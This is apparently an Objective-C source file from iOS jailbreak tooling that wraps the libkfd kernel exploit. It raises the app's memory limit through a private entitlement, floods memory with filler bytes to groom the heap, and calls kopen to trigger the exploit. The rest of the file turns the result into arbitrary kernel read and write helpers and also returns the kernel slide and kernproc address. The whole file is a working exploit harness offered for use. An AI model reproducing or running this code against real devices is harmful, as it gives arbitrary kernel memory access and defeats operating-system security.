#import <Foundation/Foundation.h>
#import "krw.h"
#import "libkfd.h"
#import "memoryControl.h"
#include <os/proc.h>
#include <inttypes.h>

uint64_t _kfd = 0;

uint64_t kopen_wrapper(void) {
    uint64_t headroomMB = 384;
    bool use_headroom = true;
    if (use_headroom) {
        size_t STATIC_HEADROOM = (headroomMB * (size_t)1024 * (size_t)1024);
        uint64_t* memory_hog = NULL;
        size_t pagesize = sysconf(_SC_PAGESIZE);
        size_t memory_avail = os_proc_available_memory();
        size_t hog_headroom = STATIC_HEADROOM + 3072 * pagesize;
        size_t memory_to_hog = memory_avail > hog_headroom ? memory_avail - hog_headroom: 0;
        int32_t old_memory_limit = 0;
        memorystatus_memlimit_properties2_t mmprops;
        NSLog(CFSTR("[memoryHogger] memory_avail = %zu"), memory_avail);
        NSLog(CFSTR("[memoryHogger] hog_headroom = %zu"), hog_headroom);
        NSLog(CFSTR("[memoryHogger] memory_to_hog = %zu"), memory_to_hog);
        if (hasEntitlement(CFSTR("com.apple.private.memorystatus"))) {
            uint32_t new_memory_limit = (uint32_t)(getPhysicalMemorySize() / UINT64_C(1048576)) * 2;
            int ret = memorystatus_control(MEMORYSTATUS_CMD_GET_MEMLIMIT_PROPERTIES, getpid(), 0, &mmprops, sizeof(mmprops));
            if (ret == 0) {
                NSLog(CFSTR("[memoryHogger] current memory limit: %zu MiB"), mmprops.v1.memlimit_active);
                old_memory_limit = mmprops.v1.memlimit_active;
                ret = memorystatus_control(MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT, getpid(), new_memory_limit, NULL, 0);
                if (ret == 0) {
                    NSLog(CFSTR("[memoryHogger] The memory limit for pid %d has been set to %u MiB successfully"), getpid(), new_memory_limit);
                } else {
                    NSLog(CFSTR("[memoryHogger] Failed to set memory limit: %d (%s)"), errno, strerror(errno));
                }
            } else {
                NSLog(CFSTR("[memoryHogger] could not get current memory limits"));
            }
        }
        if (memory_avail > hog_headroom) {
            memory_hog = malloc(memory_to_hog);
            if (memory_hog != NULL) {
                for (uint64_t i = 0; i < memory_to_hog / sizeof(uint64_t); i++) {
                    memory_hog[i] = 0x4141414141414141;
                }
            }
            NSLog(CFSTR("[memoryHogger] Filled up hogged memory with A's"));
        } else {
            NSLog(CFSTR("[memoryHogger] Did not hog memory because there is too little free memory"));
        }
        
        _kfd = kopen(3072, 2, 1, 1);
        
        if (memory_hog) free(memory_hog);
        if (old_memory_limit) {
            // set the limit back because it affects os_proc_available_memory
            int ret = memorystatus_control(MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT, getpid(), old_memory_limit, NULL, 0);
            if (ret == 0) {
                NSLog(CFSTR("[memoryHogger] The memory limit for pid %d has been set to %u MiB successfully"), getpid(), old_memory_limit);
            } else {
                NSLog(CFSTR("[memoryHogger] Failed to set memory limit: %d (%s)"), errno, strerror(errno));
            }
        }
    } else {
        _kfd = kopen(2048, 2, 1, 1);
    }
    if (_kfd == 0) {
        printf("[-] kopen failed\n");
        exit(1);
    }
    printf("[+] kopen: 0x%llx\n", _kfd);
    return _kfd;
}

int is_exploited(void) {
    return _kfd != 0;
}

void do_kread(uint64_t kaddr, void* uaddr, uint64_t size)
{
    kread(_kfd, kaddr, uaddr, size);
}

void do_kwrite(void* uaddr, uint64_t kaddr, uint64_t size)
{
    kwrite(_kfd, uaddr, kaddr, size);
}

uint64_t get_kslide(void) {
    return ((struct kfd*)_kfd)->perf.kernel_slide;
}

uint64_t get_kernproc(void) {
    return ((struct kfd*)_kfd)->info.kaddr.kernel_proc;
}

uint8_t kread8(uint64_t where) {
    uint8_t out;
    kread(_kfd, where, &out, sizeof(uint8_t));
    return out;
}
uint32_t kread16(uint64_t where) {
    uint16_t out;
    kread(_kfd, where, &out, sizeof(uint16_t));
    return out;
}
uint32_t kread32(uint64_t where) {
    uint32_t out;
    kread(_kfd, where, &out, sizeof(uint32_t));
    return out;
}
uint64_t kread64(uint64_t where) {
    uint64_t out;
    kread(_kfd, where, &out, sizeof(uint64_t));
    return out;
}

void kwrite8(uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kread8(where+1);
    _buf[2] = kread8(where+2);
    _buf[3] = kread8(where+3);
    _buf[4] = kread8(where+4);
    _buf[5] = kread8(where+5);
    _buf[6] = kread8(where+6);
    _buf[7] = kread8(where+7);
    kwrite((uint64_t)(_kfd), &_buf, where, sizeof(uint64_t));
}

void kwrite16(uint64_t where, uint16_t what) {
    uint16_t _buf[4] = {};
    _buf[0] = what;
    _buf[1] = kread16(where+2);
    _buf[2] = kread16(where+4);
    _buf[3] = kread16(where+6);
    kwrite((uint64_t)(_kfd), &_buf, where, sizeof(uint64_t));
}

void kwrite32(uint64_t where, uint32_t what) {
    uint32_t _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(where+4);
    kwrite((uint64_t)(_kfd), &_buf, where, sizeof(uint64_t));
}
void kwrite64(uint64_t where, uint64_t what) {
    uint64_t _buf[1] = {};
    _buf[0] = what;
    kwrite((uint64_t)(_kfd), &_buf, where, sizeof(uint64_t));
}

void kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    uint64_t endAddr = kaddr + size;
    uint32_t outputOffset = 0;
    unsigned char* outputBytes = (unsigned char*)output;
    
    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t k = kread32(curAddr);

        unsigned char* kb = (unsigned char*)&k;
        for(int i = 0; i < 4; i++)
        {
            if(outputOffset == size) break;
            outputBytes[outputOffset] = kb[i];
            outputOffset++;
        }
        if(outputOffset == size) break;
    }
}
